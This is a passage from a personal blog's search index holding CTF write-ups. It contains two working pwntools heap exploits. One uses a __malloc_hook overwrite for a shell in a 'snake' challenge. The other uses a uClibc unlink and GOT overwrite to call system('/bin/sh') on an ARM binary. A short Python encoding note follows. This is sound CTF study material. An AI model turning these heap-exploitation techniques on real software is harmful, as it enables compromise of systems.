class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process(<span class="string">&quot;./snake&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">command</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;4.start name&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,sz,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;long?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(sz))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name?&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">p.recvuntil(<span class="string">&quot;how long?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">0x30</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;asdasdasd&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;join&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;s&quot;</span>*<span class="number">0x23</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;words:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;exit?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>,(p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))*<span class="number">6</span>)</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index?&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x30</span>,<span class="string">&quot;7&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">get(<span class="number">1</span>)</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">pause()</span><br><span class="line">p.send(<span class="string">&quot;s&quot;</span>*<span class="number">0x23</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;player name: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>) - <span class="number">0x3c4b37</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;words:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;\x00&quot;</span>*<span class="number">0x4c</span>+<span class="string">&#x27;\x91&#x27;</span>)</span><br><span class="line">info(<span class="string">&quot;libc : &quot;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;exit?&quot;</span>)</span><br><span class="line">p.send(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x50</span>,<span class="string">&quot;\x00&quot;</span>*<span class="number">0x38</span>+p64(<span class="number">0x71</span>)+p64(libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]-<span class="number">0x23</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x68</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0xb</span>+p64(libc.address+<span class="number">0xf02a4</span>)*<span class="number">2</span></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x68</span>,payload)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">pwn()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>arm构架uclibc下的堆溢出初识</title>
      <link href="/2020/07/01/uclibc%E4%B8%8B%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/"/>
      <url>/2020/07/01/uclibc%E4%B8%8B%E7%9A%84%E5%A0%86%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h5 id="arm构架uclibc下的堆溢出初识"><a href="#arm构架uclibc下的堆溢出初识" class="headerlink" title="arm构架uclibc下的堆溢出初识"></a>arm构架<code>uclibc</code>下的堆溢出初识</h5><p>第五空间2020遇到的一道arm构架的题目。</p><span id="more"></span><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">angela@angela-dev:/mnt/hgfs/share/pwn/5space/pwnme/lib$ file a.out</span><br><span class="line">a.out: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped</span><br></pre></td></tr></table></figure><p>可以看到是32位ARM动态链接的可执行文件，运行方式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L ./lib ./a.out // ./lib为动态链接库的路径</span><br></pre></td></tr></table></figure><p>首先介绍<code>uclibc</code>，是 <code>glibc</code> 的一个精简版，主要用于嵌入式设备，比如路由器就基本使用的是 <code>uClibc</code>， 简单自然效率高。所以他和一般的<code>x86</code>的堆分配机制会有些不一样。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct heap_free_area</span><br><span class="line">&#123;</span><br><span class="line">size_t size;  //空闲区的大小</span><br><span class="line"> //用于构造循环链表</span><br><span class="line">struct heap_free_area *next, *prev;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">size 表示该空闲区域的大小，这个空闲区域的实际地址并没有用指针详细地指明，</span><br><span class="line">因为它就位于当前 heap_free_area 节点的前面，如下图所示：</span><br><span class="line"></span><br><span class="line">+-------------------------------+--------------------+</span><br><span class="line">|                               |   heap_free_area   |</span><br><span class="line">+-------------------------------+--------------------+</span><br><span class="line">\___________ 空闲空间 ___________/\___ 空闲空间信息 ___/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">实际可用的空闲空间大小为 size – sizeof(struct heap_free_area)</span><br><span class="line"></span><br><span class="line">指针 next, prev 分别指向下一个和上一个空间区域，</span><br><span class="line">所有的空闲区域就是通过许许多多这样的节点链起来的，</span><br><span class="line">很显然，这样组成的是一个双向链表。</span><br></pre></td></tr></table></figure><p>所以 <code>free</code> 块在内存中的存储方式和 <code>glibc</code> 中的存储方式是不一样的。它的元数据在块的末尾，而 <code>glibc</code>中元数据在 块的开头。</p><p>所以如果我们有一个堆溢出，我们就需要覆盖到下面空闲空间的 <code>heap_free_area</code> 中的 指针，才能实现 <code>uClibc</code>中的 <code>unlink</code> 攻击</p><p>详细介绍uclibc的博客：<a href="https://www.cnblogs.com/hac425/p/9416738.html">https://www.cnblogs.com/hac425/p/9416738.html</a></p><p>而本题中由于edit函数存在堆溢出漏洞，于是我们可以首先构造<code>overlop</code>泄露<code>libc</code>之后利用堆溢出覆盖 <code>heap_free_area</code> 中的 指针为<code>heaplist</code>造成<code>unlink</code>最后利用edit函数覆盖free的got为system</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">DEBUG=<span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">p=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./lib&quot;</span>,<span class="string">&quot;./a.out&quot;</span>])</span><br><span class="line"><span class="comment">#qemu-arm -L ./lib ./a.out</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">l,note</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(l))</span><br><span class="line">     p.sendafter(<span class="string">&quot;:&quot;</span>,note)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change</span>(<span class="params">index,l,note</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(l))</span><br><span class="line">     p.sendafter(<span class="string">&quot;:&quot;</span>,note)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">remove</span>(<span class="params">index</span>):</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">     p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;aaaaaaaa&quot;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#3</span></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x40</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x1c</span>+p64(<span class="number">0x500</span>+<span class="number">0x20</span>+<span class="number">1</span>))  <span class="comment">#利用堆溢出构造overlop即使2号堆块uaf</span></span><br><span class="line">remove(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x4f8</span>,<span class="string">&quot;aaaaaaaa&quot;</span>)  <span class="comment">#2号堆块中存在指向main_arean+88的地址</span></span><br><span class="line">show()</span><br><span class="line">p.recvuntil(<span class="string">&quot;2 : &quot;</span>)</span><br><span class="line">libc=u32(p.recv(<span class="number">4</span>))+<span class="number">0xff720000</span>-<span class="number">0xff7ba8ec</span></span><br><span class="line">success(<span class="string">&#x27;libc: &#x27;</span>+<span class="built_in">hex</span>(libc))</span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaaaaaa&#x27;</span>)  <span class="comment">#4  4号和2号指向同一堆块</span></span><br><span class="line">add(<span class="number">0x21</span>,<span class="string">&quot;aaaaaaa&quot;</span>)   <span class="comment">#5</span></span><br><span class="line">remove(<span class="number">0</span>)</span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">change(<span class="number">2</span>,<span class="number">8</span>,p32(<span class="number">0x21048</span>^<span class="number">0x22</span>))  <span class="comment">#使等下申请回来的4号堆块指向heaplist</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&quot;aaaaa&quot;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;aaaaa&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">change(<span class="number">4</span>,<span class="number">0xf8</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>+p32(<span class="number">0</span>)*<span class="number">4</span>+p32(<span class="number">0x28</span>)+p32(<span class="number">0x21038</span>)) <span class="comment">#使0号堆ptr为free_got(0x21038)</span></span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x8</span>,p32(libc+<span class="number">0x51800</span>))  <span class="comment">#覆盖got</span></span><br><span class="line"><span class="comment">#show()</span></span><br><span class="line">remove(<span class="number">4</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ARM_PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python en(de)code</title>
      <link href="/2019/04/06/python-en-de-code/"/>
      <url>/2019/04/06/python-en-de-code/</url>
      
        <content type="html"><![CDATA[<h1 id="先上代码"><a href="#先上代码" class="headerlink" title="先上代码"></a><strong>先上代码</strong></h1><p><a href="https://github.com/CodingAngela/Angela/blob/master/spider%EF%BC%88www.dytt8.net">python爬虫</a></p><p>代码写挺长的，也是边学边写，但一直搞不清楚python的encode(编码)和decode(解码)。以下是我的探究之路。</p><span id="more"></span><h2 id="一、当然先看官方文档"><a href="#一、当然先看官方文档" class="headerlink" title="一、当然先看官方文档"></a>一、当然先看官方文档</h2><p><a href="https://docs.python.org/3/library/stdtypes.html?highlight=encode#string-methods">地址如下</a></p><p>里面提到encode函数‘Return an encoded version of the string as a bytes object.’就是将字符串进行编码，返回得到bytes类型对象，</p><p>而decode函数正好相反，是将bytes解码为字符串类型。</p><h2 id="二、实际操作一下"><a href="#二、实际操作一下" class="headerlink" title="二、实际操作一下"></a>二、实际操作一下</h2><p>直接以爬虫代码为例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>run一下之后会发现很多乱码![](C:\Users\admin\Pictures\Camera Roll\11.PNG)</p><p>查了一下发现问题处在.text上，.text是返回网页的相应数据，并按照机器认为的最大可能去解码比如utf-8。而观察本站发现’charset&#x3D;gb2312’所以出现了乱码。于是，</p><p>我用encoding规定用gb2312解码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="comment"># print(response.text)</span></span><br><span class="line">response.encoding=<span class="string">&quot;gb2312&quot;</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p>果然解决了乱码问题，但这和encode,decode没啥关系。。。</p><p>接下来就有关系了。</p><p>我换了一种方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="built_in">print</span>(response.content)</span><br></pre></td></tr></table></figure><p>发现爬到的是bytes类型，意识到.content返回的数据是不进行解码的，又由于是由bytes到字符串的解码，所以使用decode()</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line"><span class="built_in">print</span>(response.content.decode(<span class="string">&#x27;gb2312&#x27;</span>))</span><br></pre></td></tr></table></figure><p>一运行，woc！报错了![](C:\Users\admin\Pictures\Camera Roll\12.PNG)</p><p>说是gb2312不能解码，这不矛盾吗…</p><p>于是赶紧上网查了一下发现gbk的解码范围包含了gb2312，于是尝试改为gbk，问题解决，成功解码~</p><p>这只是用了decode()，那再作死一下把解码的再编码回来，走你：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">response=requests.get(BASE_DOMAIN, headers=HEADERS)</span><br><span class="line">r=response.content.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(r.encode(<span class="string">&#x27;gbk&#x27;</span>))</span><br></pre></td></tr></table></figure><p>成功编码~![](C:\Users\admin\Pictures\Camera Roll\13.PNG)</p><p>经过了这次的探索尝试，搞明白了Python编码和解码，最近在学习汇编，相信之后从硬件的角度会对编码解码这方面有更深的理解!</p>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
